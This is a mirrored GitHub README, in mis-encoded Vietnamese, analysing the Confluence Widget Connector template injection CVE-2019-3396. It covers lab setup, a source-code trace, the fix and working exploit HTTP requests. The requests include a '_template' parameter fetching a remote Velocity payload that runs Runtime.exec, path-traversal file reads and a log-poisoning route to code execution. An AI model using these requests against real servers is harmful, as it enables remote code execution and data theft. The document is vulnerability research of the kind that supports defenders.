# cve-2019-3396

Confluence unauthorize template injection

| Infos    | Value                                                              |
| -------- | -------------------------------------------------------------------|
| Username | [https://github.com/PetrusViet](https://github.com/PetrusViet) |
| Url      | [https://github.com/PetrusViet/cve-2019-3396](https://github.com/PetrusViet/cve-2019-3396)                                               |
| Stars    | 3                                                          |
| License  | No License                                                        |

<details>

<summary>Topic / Tags</summary>



</details>

## Readme

# Confluence unauthorize template injection (CVE-2019-3396)

## I) Building
- Bug n√†y x·∫£y ra tr√™n c√°c phi√™n b·∫£n:
  * T·∫•t c·∫£ c√°c phi√™n b·∫£n 1.x.x, 2.x.x, 3.x.x, 4.x.x v√† 5.x.x
  * T·∫•t c·∫£ c√°c phi√™n b·∫£n 6.0.x, 6.1.x, 6.2.x, 6.3.x, 6.4.x v√† 6.5.x
  * T·∫•t c·∫£ c√°c phi√™n b·∫£n 6.6.x tr∆∞·ªõc 6.6.12
  * T·∫•t c·∫£ c√°c phi√™n b·∫£n 6.7.x, 6.8.x, 6.9.x, 6.10.x v√† 6.11.x
  * T·∫•t c·∫£ c√°c phi√™n b·∫£n 6.12.x tr∆∞·ªõc 6.12.3
  * T·∫•t c·∫£ c√°c phi√™n b·∫£n 6.13.x tr∆∞·ªõc 6.13.3
  * T·∫•t c·∫£ c√°c phi√™n b·∫£n 6.14.x tr∆∞·ªõc 6.14.2
- Sau khi t·∫£i source v·ªÅ c√°c b·∫°n c·∫ßn:
  * S·ª≠a gi√° tr·ªã `confluence.home`v·ªÅ ƒë·ªãa ch·ªâ confluence home ·ªü file ./confluence/WEB-INF/classes/confluence-init.properties
  * Th√™m gi√° tr·ªã `CATALINA_OPTS` ƒë·ªÉ ch∆∞∆°ng tr√¨nh c√≥ th·ªÉ ch·∫°y ·ªü ch·∫ø ƒë·ªô remote debug
  
V·ªõi windown, file ./bin/setenv.bat 
```
set CATALINA_OPTS=-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005
```
v·ªõi linux, file ./bin/setenv.sh
```
CATALINA_OPTS="-Xrunjdwp:transport=dt_socket,suspend=n,server=y,address=5005 ${CATALINA_OPTS}"  
```
  * T·∫°i IDE (Intellij) ta t·∫°o m·ªôt Debug Configurations: `Remote JVM Debug`  v·ªõi gi√° tr·ªã `host` v√† `port` l√† localhost:5005 v√† `Command line aguments for remote JVM`
```
-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005
```
  * Ta c√≥ th·ªÉ s·ª≠ d·ª•ng Postgresql l√†m database:
```
$ su - postgres
postgres@ubuntu:~$ psql -U postgres
postgres@ubuntu:~$ psql -U postgres
psql (10.6 (Ubuntu 10.6-0ubuntu0.18.04.1))
Type "help" for help.
 
postgres=# CREATE USER wiki WITH PASSWORD 'wiki';
CREATE ROLE
postgres=# CREATE DATABASE wiki OWNER wiki;
CREATE DATABASE
postgres=# GRANT ALL PRIVILEGES ON DATABASE jira TO wiki;
GRANT
```
  * Ta c·∫ßn add gi√≥i jar: ./confluence/WEB-INF/atlassian-bundled-plugins/widgetconnector-x.x.x.jar, ./confluence/WEB-INF/lib/confluence-x.x.x.jar, ./confluence/WEB-INF/lib/velocity-x.x.x-atlassian-x.jar v√†o lib ƒë·ªÉ khi debug ta c√≥ th·ªÉ th·∫•y souce c·∫ßn thi·∫øt.
  

  * Ta ti·∫øn h√†nh ch·∫°y file ./bin/start-confluence.bat v√† c√°c b·∫°n c√≥ th·ªÉ tham kh·∫£o th√™m [h∆∞·ªõng d·∫´n n√†y](https://developer.atlassian.com/server/confluence/building-confluence-from-source-code/) ƒë·ªÉ install t·ª´ source.
## II) Ph√¢n t√≠ch
- Sau khi ƒë·ªçc Description, ta c√≥ th·ªÉ bi·∫øt bug n√†y b·∫Øt ƒë·∫ßu t·ª´ t√≠nh nƒÉng `Widget Connector` th·∫ø n√™n m√¨nh google ngay ƒë·ªÉ bi·∫øt t√≠nh nƒÉng n√†y l√† g√¨, v√† l√†m sao ƒë·ªÉ s·ª≠ d·ª•ng:

  ![2](https://user-images.githubusercontent.com/63145078/116819131-d319e380-ab98-11eb-846f-1ae8a0ca0ac2.png)
  <i> v√†o edit m·ªôt page <i/>
 
  ![3](https://user-images.githubusercontent.com/63145078/116819140-db721e80-ab98-11eb-8048-f0a2d9061f3f.png)<br>
  <i> Ch·ªçn Orther macros<i/>
  
  ![4](https://user-images.githubusercontent.com/63145078/116819155-eb89fe00-ab98-11eb-8d95-30d2c5498b1c.png)
  <i>Ch·ªçn Widget connector <i/>
  
  ![image](https://user-images.githubusercontent.com/63145078/116819231-59cec080-ab99-11eb-8c3d-876e9a04b527.png)
  
- M√¨nh ch·ªçn b·ª´a c√°c th√¥ng s·ªë r·ªìi ·∫•n v√†o preview, sau ƒë√≥ chuy·ªÉn qua burp ƒë·ªÉ xem c√≥ g√¨ hay kh√¥ng. 
  ![image](https://user-images.githubusercontent.com/63145078/116819395-2476a280-ab9a-11eb-9e23-78ed969b6425.png)
- ·ªû g√≥i tin n√†y, m√¨nh th·∫•y c√≥ m·ªôt th√¥ng s·ªë `"pluginKey":"com.atlassian.confluence.extra.widgetconnector"` v·∫≠y n√™n m√¨nh ƒëo√°n r·∫±ng t√≠nh nƒÉng `Widget Connector` ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a ·ªü class `com.atlassian.confluence.extra.widgetconnector` v·∫≠y n√™n m√¨nh ƒë√£ t√¨m ki·∫øm trong path xem c√≥ g√≥i jar n√†o kh·∫£ nghi hay kh√¥ng.  

![image](https://user-images.githubusercontent.com/63145078/116819757-9ef3f200-ab9b-11eb-98e6-a44f85f96378.png)

- m√¨nh th·ª≠ add file ./confluence/WEB-INF/atlassian-bundled-plugins/widgetconnector-x.x.x.jar v√†o lib c·ªßa project ƒë·ªÉ c√≥ th·ªÉ ƒë·ªçc source code v√† debug.

  ![1](https://user-images.githubusercontent.com/63145078/116822945-d4084080-abab-11eb-809b-09a57f71797c.png) <br>
  <i>C√°ch add file jar v√†o lib<i/>

- M·ªü pack widgetconnector m√¨nh th·∫•y c√≥ c·∫£m t√¨nh v·ªõi class `WidgetMacro` n√™n m√¨nh ƒë·∫∑t breakpoit t·∫°i contructor v√† h√†m execute c·ªßa class n√†y ƒë·ªÉ xem khi m√¨nh s·ª≠ d·ª•ng t√≠nh nƒÉng `Preview` th√¨ class n√†y c√≥ ƒë∆∞·ª£c g·ªçi hay kh√¥ng üïµÔ∏è
  
  - ![image](https://user-images.githubusercontent.com/63145078/116855564-cbebe780-ac23-11eb-9490-c6be1f60346e.png)
  - H√†m `execute` ƒë√£ ƒë∆∞·ª£c g·ªçi, sau ƒë√≥ ch∆∞∆°ng tr√¨nh g·ªçi t·ªõi `DefaultRenderManager.getEmbeddedHtml` 
  - ![image](https://user-images.githubusercontent.com/63145078/116858333-677f5700-ac28-11eb-813c-9e7771e9aaab.png)

  - Ta th·∫•y ƒë·ªÉ v√†o ƒë∆∞·ª£c trong `if` ta c·∫ßn th·ªèa m√£n ƒëi·ªÅu ki·ªán `widgetRenderer.matches(url)`. Ta ti·∫øn h√†nh ki·ªÉm tra h√†m `widgetRenderer.matches(url)` ·ªü class `YoutubeRenderer`
  - ![image](https://user-images.githubusercontent.com/63145078/116862662-50903300-ac2f-11eb-8374-44109c5afe17.png)
  - ![image](https://user-images.githubusercontent.com/63145078/116862836-8e8d5700-ac2f-11eb-8344-f0dd11177697.png)
  - Nh∆∞ v·∫≠y m√¨nh c·∫ßn ƒë·ªÉ parameter `url` l√† m·ªôt ƒë∆∞·ªùng d·∫´n video c·ªßa youtube (ho·∫∑c Vimeo, Twitter, ...). M√¨nh set `url` th√†nh url c·ªßa m·ªôt video youtube b·∫•t k·ª≥ v√† ch∆∞∆°ng tr√¨nh ƒë√£ nh·∫£y v√†o c√¢u `if` sau ƒë√≥ g·ªçi t·ªõi h√†m `widgetRenderer.getEmbeddedHtml(url, params)` (class YoutubeRenderer)
  -  ![image](https://user-images.githubusercontent.com/63145078/116863777-0019d500-ac31-11eb-9dab-70c0f8780bac.png)
  -  Ch∆∞∆°ng tr√¨nh nh·∫£y t·ªõi h√†m `setDefaultParam` t·∫°i ƒë√¢y ta c√≥ th·∫•y m·ªôt hidden params `_template` c√≥ v·∫ª kh·∫£ nghi :)
  -  ![image](https://user-images.githubusercontent.com/63145078/116864154-99e18200-ac31-11eb-8342-bd62bb6e89d9.png)
  -  Sau khi tho√°t kh·ªèi h√†m `setDefaultParam`, ch∆∞∆°ng tr√¨nh g·ªçi t·ªõi h√†m `DefaultVelocityRenderService.render`
  -  ![image](https://user-images.githubusercontent.com/63145078/116864312-dd3bf080-ac31-11eb-895b-c418ee740a2f.png)
  -  Ti·∫øp t·ª•c qua h√†m `getRenderedTemplate` v√† `VelocityUtils.getRenderedTemplate(String templateName, Map<?, ?> contextMap)`
  -  ![image](https://user-images.githubusercontent.com/63145078/116864392-f93f9200-ac31-11eb-8e05-dea6331b54c8.png)
  -  ![image](https://user-images.githubusercontent.com/63145078/116864542-373cb600-ac32-11eb-86b0-d454d5c076c6.png)
  -  Ti·∫øp t·ªõi ` VelocityUtils.getRenderedTemplate(String templateName, Context context)` v√† `getRenderedTemplateWithoutSwallowingErrors(templateName, context)`
  -  ![image](https://user-images.githubusercontent.com/63145078/116864892-ca75eb80-ac32-11eb-94f8-8c42f0518c78.png)
  -  H√†m `renderTemplateWithoutSwallowingErrors` 
  -  ![image](https://user-images.githubusercontent.com/63145078/116864932-deb9e880-ac32-11eb-8d03-6ec380dcfdab.png)
  -  Ch∆∞∆°ng tr√¨nh g·ªçi h√†m `getTemplate` r·ªìi t·ªõi `VelocityEngine.getTemplate` v√† `RuntimeInstance.getTemplate`,  t·∫°i ƒë√¢y ta th·∫•y ch∆∞∆°ng tr√¨nh g·ªçi h√†m `getResource` v·ªõi tham s·ªë ƒë·∫ßu v√†o ch√≠nh l√† gi√° tr·ªã c·ªßa  params `_template`. V·ªõi java, h√†m `getResource` c√≥ th·ªÉ d√πng ƒë·ªÉ load resource ·ªü d·∫°ng file local ho·∫∑c l√† m·ªôt ti·ªáp ·ªü tr√™n internet (th√¥ng qua giao th·ª©c HTTP). 
  -  D·ª´ng l·∫°i v√† suy nghƒ©: ƒëi·ªÅu n√†y ph·∫£i chƒÉng cho ph√©p attacker ƒë∆∞a m·ªôt template (t·ª´ local server ho·∫∑c t·ª´ host c·ªßa attacker) b·∫•t k·ª≥ v√†o ch∆∞∆°ng tr√¨nh b·∫±ng c√°ch ch√®n th√™m params `_template` v√†o request hay sao ??
  -  ![image](https://user-images.githubusercontent.com/63145078/116865297-8d5e2900-ac33-11eb-935c-fad727571d7f.png)
  -  Ch√∫ng ta ti·∫øp t·ª•c trace ng∆∞·ª£c l·∫°i, ƒë·ªÉ xem sau khi c√≥ ƒë∆∞·ª£c template th√¨ ch∆∞∆°ng tr√¨nh x·ª≠ l√Ω th·∫ø n√†o:
  -  Sau khi ƒë√£ c√≥ template, ch∆∞∆°ng tr√¨nh g·ªçi h√†m `VelocityUtils.renderTemplateWithoutSwallowingErrors(template, context, writer);`
  -  ![image](https://user-images.githubusercontent.com/63145078/116865899-b4692a80-ac34-11eb-9dc4-bc875c6b5736.png)
  -  R·ªìi sau ƒë√≥ t·ªõi `template.merge(context, writer);`
  
  ```ruby
  public void merge(Context context, Writer writer, List macroLibraries) throws ResourceNotFoundException, ParseErrorException, MethodInvocationException {
        if (this.errorCondition != null) {
            throw this.errorCondition;
        } else if (this.data == null) {
            String msg = "Template.merge() failure. The document is null, most likely due to parsing error.";
            throw new RuntimeException(msg);
        } else {
            InternalContextAdapterImpl ica = new InternalContextAdapterImpl(context);
            ica.setMacroLibraries(macroLibraries);
            if (macroLibraries != null) {
                for(int i = 0; i < macroLibraries.size(); ++i) {
                    try {
                        this.rsvc.getTemplate((String)macroLibraries.get(i));
                    } catch (ResourceNotFoundException var17) {
                        this.rsvc.getLog().error("template.merge(): cannot find template " + (String)macroLibraries.get(i));
                        throw var17;
                    } catch (ParseErrorException var18) {
                        this.rsvc.getLog().error("template.merge(): syntax error in template " + (String)macroLibraries.get(i) + ".");
                        throw var18;
                    } catch (Exception var19) {
                        throw new RuntimeException("Template.merge(): parse failed in template  " + (String)macroLibraries.get(i) + ".", var19);
                    }
                }
            }

            if (this.provideScope) {
                ica.put(this.scopeName, new Scope(this, ica.get(this.scopeName)));
            }

            try {
                ica.pushCurrentTemplateName(this.name);
                ica.setCurrentResource(this);
                ((SimpleNode)this.data).render(ica, writer);      ### POC c√≥ th·ªÉ ƒë∆∞·ª£c render ·ªü ƒë√¢y  ###
            } catch (StopCommand var20) {
                if (!var20.isFor(this)) {
                    throw var20;
                }

                if (this.rsvc.getLog().isDebugEnabled()) {
                    this.rsvc.getLog().debug(var20.getMessage());
                }
            } catch (IOException var21) {
                throw new VelocityException("IO Error rendering template '" + this.name + "'", var21);
            } finally {
                ica.popCurrentTemplateName();
                ica.setCurrentResource((Resource)null);
                if (this.provideScope) {
                    Object obj = ica.get(this.scopeName);
                    if (obj instanceof Scope) {
                        Scope scope = (Scope)obj;
                        if (scope.getParent() != null) {
                            ica.put(this.scopeName, scope.getParent());
                        } else if (scope.getReplaced() != null) {
                            ica.put(this.scopeName, scope.getReplaced());
                        } else {
                            ica.remove(this.scopeName);
                        }
                    }
                }

            }

        }
    }
  ```
  - T·∫°i ƒë√¢y ta th·∫•y ch∆∞∆°ng tr√¨nh c√≥ g·ªçi t·ªõi `SimpleNode.render`, H√†m n√†y s·ª≠ d·ª•ng template Velocity ƒë·ªÉ parse template. T·ªõi ƒë√¢y ta c√≥ th·ªÉ th·∫•y c√≥ th·ªÉ vi·∫øt PoC RCE ƒë∆∞·ª£c r·ªìi:
 
 G√≥i POST request khi y√™u c·∫ßu t√≠nh nƒÉng `Preview`
  ```
  POST /rest/tinymce/1/macro/preview HTTP/1.1
Host: localhost:8090
Cookie: seraph.confluence=; JSESSIONID=
Connection: close

{
  "contentId":"622594",
  "macro": {
      "name":"widget",
      "body":"","params": {
        "url":"https://www.youtube.com/watch?v=WfDp-TkSoFY&ab_channel=TAPMusic",
        "width":"10",
        "height":"10",
        "_template":"https://pastebin.com/raw/JPEpiuLG"
        }
  }
}
  ```
  file payload
  ```
  #set($x="x")
  $x.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("calc")
  ```
  - PoC ƒë√£ ch·∫°y th√†nh c√¥ng:
  - ![image](https://user-images.githubusercontent.com/63145078/116867871-f778cd00-ac37-11eb-94a7-0a16ffe406d4.png)

  ### Stack call
  ```
  WidgetMacro: execute
	-> DefaultRenderManager: getEmbeddedHtml
		-> YoutubeRenderer: getEmbeddedHtml
			-> DefaultVelocityRenderService: render -> getRenderedTemplate
				-> (confluence-6.12.2.jar) VelocityUtils: getRenderedTemplate -> getRenderedTemplate -> getRenderedTemplateWithoutSwallowingErrors -> renderTemplateWithoutSwallowingErrors -> getTemplate -> getVelocityEngine
					
					-> VelocityEngine: getTemplate
						-> RuntimeInstance: getResource 

				-> (confluence-6.12.2.jar) VelocityUtils: renderTemplateWithoutSwallowingErrors

					-> Template: merge
						=>  SimpleNode: render
  ```

Nh∆∞ v·∫≠y l√† ta ƒë√£ PoC l·∫°i th√†nh c√¥ng bug n√†y, nh∆∞ng trong tr∆∞·ªùng h·ª£p target l√† m·ªôt server chƒÉn outbount attacker kh√¥ng th·ªÉ get resource t·ª´ ngo√†i internet ch·ªâ c√≥ th·ªÉ get resource l√† nh·ªØng file trong local c·ªßa server.

### V·∫≠y trong tr∆∞·ªùng h·ª£p ƒë√≥, l√†m sao ƒë·ªÉ c√≥ th·ªÉ khai th√°c ?

M√¨nh nh·∫≠n ƒë∆∞·ª£c m·ªôt g·ª£i √Ω l√† b·∫±ng m·ªôt c√°ch n√†o ƒë√≥ user c√≥ th·ªÉ inject payload v√†o file log. ƒê√¢y l√† m·ªôt √Ω t∆∞·ªüng kh√° hay, n√™n m√¨nh b·∫Øt ch√¢n l√™n tr√°n t√¨m c√°ch ngay.
  - M√¨nh b·∫Øt ƒë·∫ßu xem c√°c file log trong Confluence Home ƒë·ªÉ xem ch√∫ng c√≥ g√¨ ƒë·∫∑c bi·ªát. M√¨nh xem c√°c file log ·ªü ./shared-home/analytics-logs/ v√† th·∫•y c√≥ m·ªôt s·ªë key-value quen thu·ªôc, c√≥ v·∫ª nh∆∞ ch√∫ng ƒë∆∞·ª£c g·ª≠i t·ª´ ph√≠a client-side
  - ![image](https://user-images.githubusercontent.com/63145078/116901323-f9f11c00-ac63-11eb-9948-4975f92719a1.png)
  - M√¨nh th·∫•y c√≥ g√≥i `POST /rest/analytics/1.0/publish/bulk` c√≥ g·ª≠i ƒëi m·ªôt s·ªë key-value nh∆∞ tr√™n.
 ```
[{"name":"browser.metrics.navigation",
"properties":{
  "apdex":"0.5",
  "firstPaint":"528",
  "isInitial":"true",
  "journeyId":"9e60e71a-8ebe-478c-a638-ee9423f5798f",
  "key":"confluence.dashboard.view",
  "navigationType":"0",
  "readyForUser":"1117",
  "redirectCount":"0",
  "resourceLoadedEnd":"499",
  "resourceLoadedStart":90.35499999299645,
  "threshold":"1000",
  "unloadEventStart":"47",
  "unloadEventEnd":"47",
  "fetchStart":"25",
  "domainLookupStart":"25",
  "domainLookupEnd":"25",
  "connectStart":"25",
  "connectEnd":"25",
  "requestStart":"27",
  "responseStart":"28",
  "responseEnd":"37",
  "domLoading":"52",
  "domInteractive":"538",
  "domContentLoadedEventStart":"538",
  "domContentLoadedEventEnd":"691",
  "domComplete":"1176",
  "loadEventStart":"1176",
  "loadEventEnd":"1176",
  "userAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
  "pageEnd":"531",
  "isBigPipeEnabled":"false",
  "serverDuration":"339",
  "requestCorrelationId":"36006c54d2919ecd",
  "resourceTiming":"{\"√¢Àú¬†\":[\"2,2i,2i,,,2i,,2i,2i,2i\",\"2,2i,31,2m,2k,2i,,2i,2i,2i\",\"2,2j,31,2m,2l,2j,,2j,2j,2j\",\"3,2l,2l,,,2l,,2l,2l,2l\",\"3,2l,2l,,,2l,,2l,2l,2l\",\"3,2m,2m,,,2m,,2m,2m,2m\",\"3,2n,2n,,,2n,,2n,2n,2n\",\"5,bz,cv,cv,c0,bz,,bz,bz,bz\",\"4,d6,d6,,,d6,,d6,d6,d6\",\"4,d7,d7,,,d7,,d7,d7,d7\",\"3,dq,dv,dr,dq,dq,,dq,dq,dq\",\"4,ej,ej,,,ej,,ej,ej,ej\",\"4,ej,ej,,,ej,,ej,ej,ej\",\"4,er,er,,,er,,er,er,er\",\"5,fl,fn,fn,fm,fl,,fl,fl,fl\",\"5,g9,ha,h9,gb,g9,,g9,g9,g9\",\"4,hv,hv,,,hv,,hv,hv,hv\",\"4,hv,hv,,,hv,,hv,hv,hv\",\"4,ik,ik,,,ik,,ik,ik,ik\",\"4,ik,ik,,,ik,,ik,ik,ik\",\"4,il,il,,,il,,il,il,il\",\"5,h4,ta,t0,pl,pk,,h6,h4,h4\"]}",
  "userTimingRaw":"{\"marks\":{},\"measures\":{}}","experiments":"[]"},"timeDelta":-5176
  }]
 ```
  - M√¨nh th·ª≠ thay th·∫ø m·ªôt s·ªë value th√¨ th·∫•y c√≥ value `resourceTiming` c√≥ th·ªÉ t√πy √Ω ch·ªânh s·ª≠a m√† v·∫´n ƒë∆∞·ª£c ƒë∆∞a v√†o log
  - ![image](https://user-images.githubusercontent.com/63145078/116903622-d380b000-ac66-11eb-837a-f23273939ea5.png)
  - Nh∆∞ v·∫≠y l√† ta ƒë√£ c√≥ th·ªÉ ƒë∆∞a payload v√†o file log n·∫±m tr√™n local c·ªßa server.
  - T·ª´ ƒë√¢y ta c√≥ th·ªÉ ƒë·ªçc file ./confluence/WEB-INF/classes/confluence-init.properties ƒë·ªÉ bi·∫øt ƒë∆∞·ª£c v·ªã tr√≠ c·ªßa confluence home
  ```
  POST /rest/tinymce/1/macro/preview HTTP/1.1
    
{
"contentId":"1507329",
"macro":{
  "name":"widget",
  "body":"",
  "params":{
    "url":"https://www.youtube.com/watch?v=WfDp-TkSoFY&ab_channel=TAPMusic",
    "_template":"/../../WEB-INF/classes/confluence-init.properties",
    "width":"11",
    "height":"11"
    }
  }
}
  ```
  - R·ªìi t·ª´ ƒë√≥ t√¨m t·ªõi v·ªã tr√≠ file log c√≥ ch·ª©a payload m√† m√¨nh ƒë√£ inject v√†o:

```  
POST /rest/tinymce/1/macro/preview HTTP/1.1
    
{
"contentId":"1507329",
"macro":{
  "name":"widget",
  "body":"",
  "params":{
    "url":"https://www.youtube.com/watch?v=WfDp-TkSoFY&ab_channel=TAPMusic",
    "_template":"file:C://Users/XXXXX...XXXXX/.confluence/shared-home/analytics-logs/bd0f2792fe0234be516b843e25d54a14.515465381.atlassian-analytics.log",
    "width":"11",
    "height":"11"
    }
  }
}
```
 - N·∫øu file log qu√° l·ªõn kh√¥ng th·ªÉ ƒë∆∞a v√†o template ƒë·ªÉ parse ta c√≥ th·ªÉ push log ƒë·ªÉ file log ƒë·∫°t gi·ªõi h·∫°n k√≠ch th∆∞·ªõc, l√∫c ƒë√≥ h·ªá th·ªëng t·ª± ƒë·ªông ghi log sang file m·ªõi v√† attacker c√≥ th·ªÉ nh√¢n c√≥ h·ªôi file log m·ªõi c√≥ k√≠ch th∆∞·ªõc ch∆∞a l·ªõn ƒë·ªÉ inject payload ƒë·ªÉ s·ª≠ d·ª•ng.
 
 ## III) Fix
 
  T·∫°i b·∫£n path, class WidgetMacro ƒë√£ ƒë∆∞·ª£c vi·∫øt th√™m h√†m `doSanitizeParameters` ƒë·ªÉ x√≥a param "_template" tr∆∞·ªõc khi g·ªçi `renderManager.getEmbeddedHtml(url, parameters);` 
  
 ![image](https://user-images.githubusercontent.com/63145078/116958444-da3e1000-acc4-11eb-855c-d64a9e965990.png)
 ![image](https://user-images.githubusercontent.com/63145078/116958650-841d9c80-acc5-11eb-8843-12f9a0435f06.png)
 ![image](https://user-images.githubusercontent.com/63145078/116958484-06599100-acc5-11eb-93c4-61a982a5a91f.png)

 



  




## Get the content

```
git clone https://github.com/PetrusViet/cve-2019-3396
cd cve-2019-3396
```

{% embed url="https://github.com/PetrusViet/cve-2019-3396" %}

<figure><img src="https://avatars.githubusercontent.com/u/63145078?v=4" alt=""><figcaption><p>PetrusViet</p></figcaption></figure>
